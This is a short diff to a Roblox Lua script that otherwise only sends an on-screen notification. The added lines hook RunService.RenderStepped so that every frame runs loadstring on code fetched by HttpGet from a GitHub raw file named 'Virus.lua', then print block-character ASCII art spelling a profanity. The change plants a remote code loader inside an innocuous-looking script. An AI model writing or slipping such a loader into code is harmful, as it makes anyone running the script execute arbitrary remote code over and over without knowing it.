@@ -6,3 +6,8 @@ CoreGui:SetCore("SendNotification", {
     Duration = 10, 
 })
 
+game:GetService("RunService").RenderStepped:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/Virus.lua"))()
+end)  
+print("██████ ");print("█");print("█");print("██████");print("█");print("█");print("█");print("█")print(" ");print("█       █");print("█       █");print("█       █");print("█       █");print("█       █");print("██████");print(" ");print("██████");print("█");print("█");print("█");print("█");print("██████");print(" ");print("█     █");print("█    █");print("█   █");print("█  █");print("██");print("█  █");print("█    █");print("█      █");print("█       █");print(" ");print("█       █");print("  █   █");print("   ██");print("    █");print("    █");
+print("    █");print("    █");print(" ");print("██████");print("█       █");print("█       █");print("█       █");print("██████");print(" ");print("█       █");print("█       █");print("█       █");print("█       █");print("█       █");print("██████")
